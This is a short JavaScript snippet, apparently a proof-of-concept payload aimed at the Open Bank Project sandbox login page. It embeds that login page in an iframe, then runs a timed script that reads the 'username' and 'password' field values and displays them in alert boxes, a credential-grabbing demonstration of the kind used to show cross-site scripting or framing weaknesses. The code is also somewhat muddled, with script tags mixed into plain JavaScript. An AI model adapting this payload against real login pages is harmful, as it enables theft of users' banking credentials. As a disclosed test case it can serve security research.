var iframe = document.createElement("iframe");   
iframe.src = "https://apisandbox.openbankproject.com/user_mgt/login";
 iframe.style.width = "640px";
 iframe.style.height = "480px";

<script>
 setTimeout(function() {getPass();},500);
      function getPass() {
           var username = document.getElementById('username').value;
           var password = document.getElementById('password').value;
           alert(username);
        alert(password);
      }
</script>

document.body.appendChild(iframe);
